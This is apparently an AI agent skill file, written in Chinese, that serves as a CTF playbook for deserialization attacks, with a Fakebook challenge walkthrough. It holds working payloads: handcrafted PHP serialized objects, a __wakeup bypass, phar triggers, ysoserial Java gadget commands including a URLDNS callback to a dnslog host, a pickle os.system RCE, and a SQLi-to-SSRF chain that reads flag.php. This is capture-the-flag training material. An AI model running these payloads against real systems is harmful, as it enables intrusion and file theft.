---
name: ctf-web-deser
description: CTF 反序列化 攻击 playbook。识别/触发：反序列化/deserialize/unserialize/PHP O:数字:/Java rO0/pickle/phar/__wakeup/__destruct/gadget chain/魔术方法。碰到源码出现 unserialize($_GET/$_COOKIE)、响应里泄露 O:8:"UserInfo":... 串、Java 报文 body 以 rO0AB 开头、Python pickle.loads、phar:// 协议触发文件函数、__wakeup/__destruct 魔术方法可控等指纹时，由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF 反序列化 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径（union/盲注/文件读），OOB 仅作探测。

## 识别特征（什么时候调我）
- 源码出现 `unserialize($_GET/$_POST/$_COOKIE)`、`pickle.loads()`、`ObjectInputStream.readObject()`，输入可控
- 响应正文或报错里看到 `O:8:"UserInfo":3:{...}`、`a:2:{s:...}` 等 PHP 序列化指纹（`O:`类对象 / `a:`数组 / `s:`串 / `i:`整）
- Java 报文 `Content-Type: application/x-java-serialized-object`，body 以 `rO0AB`（base64 的 `0xACED0005`）开头
- 报错栈含 `__wakeup` / `__destruct` / `__toString` / `__call` / `__get`、`readObject()`、`__reduce__`(pickle) 等魔术方法
- 路由参数出现 `phar://`、或上传 `.phar` 后被 `file_exists()` / `is_dir()` / `getimagesize()` 等 phar 感知函数处理
- 题目给了 `*.php.bak` / `.class` / 反编译 jar / 一段 gadget 链源码

## 核心攻击手法

### PHP 反序列化（最常见）
套路三步：① 找含魔术方法的类（`__wakeup`/`__destruct`/`__toString`/`__call`/`__get`）；② 倒推可控属性使魔术方法做出危险动作（拼 SQL、`eval`、`curl`、`include`、`system`）；③ 手搓 `O:N:"Class":M:{...}` 串注入。串长必须精确，错一字 → `unserialize(): Error at offset`。

```
# 手搓模板：O:类名长:"类名":属性数:{s:属性名长:"属性名";s:值长:"值";...}
O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:1;s:4:"blog";s:12:"file:///flag";}
```

- **绕 `__wakeup`**（PHP <5.6.25 / 7.0.10，CVE-2016-7124）：把属性数写成大于真实值即可跳过：`O:8:"X":3:{...}` → `O:8:"X":4:{...}`
- PHP >=7.4 用引用 `R:` / `r:` 或自定义序列化 `C:` 绕校验
- 本地生成再改长度最稳：`php -r 'echo serialize(...);'`

### PHP phar 反序列化（绕过 unserialize 不可见点）
没显式 `unserialize` 但有文件操作函数？查 phar 感知函数（`file_exists`/`is_file`/`is_dir`/`getimagesize`/`file_get_contents`/`fopen`/`md5_file`...），把恶意序列化对象塞进 phar 的 manifest：

```
# 生成恶意 phar（php.ini 需 phar.readonly=0，或脚本里用内置类绕）
php -d phar.readonly=0 gen.php          # 写入 stub + manifest 对象
# 触发：把 evil.phar 改名 .jpg 上传，让任意 phar 感知函数吃到 phar:// 协议
?file=phar://uploads/evil.jpg/x
```

### Java 反序列化（rO0AB / ACED0005）
- 识别：响应 magic bytes `AC ED 00 05` 或 base64 `rO0AB`
- 工具链：`ysoserial` 按 sink 选 gadget（CommonsCollections1/5/6/7、CommonsBeanutils1、JRMP、URLDNS）
- **CTF 靶机常不出网** → 优先不回连 gadget：`CommonsBeanutils1`、内存马注入；URLDNS 只用来盲探 gadget 是否生效（DNS 也可能被靶机过滤，无回连 ≠ 不存在漏洞）

```
# 生成 RCE payload（靶机不出网时避免 LDAP/RMI 回连类 gadget）
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
# URLDNS 盲探（仅触 DNS，验证反序列化点是否真存在）
java -jar ysoserial.jar URLDNS 'http://xxx.dnslog.cn' > dns.bin
```

### Python pickle
`pickle.loads()` / `yaml.load()` / `multiprocessing` 反序列化可控 → `__reduce__` 构造 RCE：

```
import pickle, os
class P:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
print(pickle.dumps(P()))   # 塞进 cookie / 请求体送回
```

## CTF 实战结晶

### Fakebook（网鼎杯 2018）— SQLi 写入序列化串 → unserialize → 自动 SSRF
链路：`ctf-web-sqli` → **`ctf-web-deser`** → `ctf-web-ssrf`

- **题面**：PHP/Apache 站点，`view.php?no=` 数字注入，`/robots.txt` 泄露 `/user.php.bak`
- **关键源码**：`view.php:31` `unserialize($res['data'])`；`UserInfo::getBlogContents()` 调 `get($this->blog)`，`get()` 用 curl **未设 `CURLOPT_PROTOCOLS`**（→ 允许 `file://` SSRF）；SQLite `users(id, username, password, data)`，data 列存序列化 UserInfo
- **WAF 绕过**：`db.php` 的 `anti_sqli()` 正则 `/union\Wselect|0x|hex/i`，`union select` 被拦；用 `union/**/select`（注释当单词边界）绕过。4 列（`order by 5` 报 "should be between 1 and 4" 确认）
- **data 列原值**（admin）：
  ```
  O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:25;s:4:"blog";s:20:"https://www.test.com";}
  ```
- **构造 payload**：把 `blog` 改成 `file:///var/www/html/flag.php`，重新算长度 `s:25:"file:///var/www/html/flag.php";`，UNION 注入到第 4 列（data）：
  ```
  view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:1;s:4:"blog";s:25:"file:///var/www/html/flag.php";}'
  ```
- **触发链**：`view.php` 取出 data → `unserialize` → 业务方法 `getBlogContents()` 被自动调 → curl `file:///var/www/html/flag.php` → 内容 base64 塞进 `<iframe src='data:text/html;base64,...'>`
- **拿 flag**：`base64 -d` 解码 iframe → `flag{cc6967ce-f4af-487f-9047-20711401ec7a}`（注意 `/flag` 空读、`/etc/passwd` 可读、`flag.php` 才是 flag，多试路径）
- **结晶要点**：① 手搓 PHP 串长度必须精确，错字节即 `Error at offset N of M bytes`；② 这里没有显式 `__wakeup`，触发点是**业务方法** `getBlogContents()` 被 view 流程顺手调用——识别"反序列化后哪些方法会被自动调"才是构造入口，不只盯魔术方法；③ 反序列化常作**串联点**，单独不出分，靠 SQLi 注入恶意串 + SSRF 收尾。

## 工具命令

```bash
# PHP：本地生成/校验序列化串长度（避免手算长度出错）
php -r 'echo serialize(["blog"=>"file:///var/www/html/flag.php"]);'

# Java：ysoserial 生成 + base64 送 cookie/body
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0

# Python：pickle payload 生成
python3 -c 'import pickle,os;
class P:
    def __reduce__(self): return (os.system,("cat /flag",))
print(pickle.dumps(P()))'

# 解码 iframe / 回显 base64
echo 'BASE64HERE' | base64 -d

# phar 生成（php.ini 设 phar.readonly=0）
php -d phar.readonly=0 gen_phar.php
```

## 深度参考（穷尽技巧时加载）
- /home/threed/.claude/skills/hack-skills-main/skills/deserialization-insecure/SKILL.md

## 关联 leaf
- `ctf-web-sqli`（Fakebook 链上游：把恶意序列化串经 SQLi 注入写进 data 列）
- `ctf-web-ssrf`（Fakebook 链下游：反序列化对象触发 curl file:// 读 flag.php）
- `ctf-web-xxe`（同属"可控输入 → 解析器 → 触发危险"，常一起出现）
- `ctf-web-ssti`（魔术方法/模板渲染类似入口，识别后二选一路由）
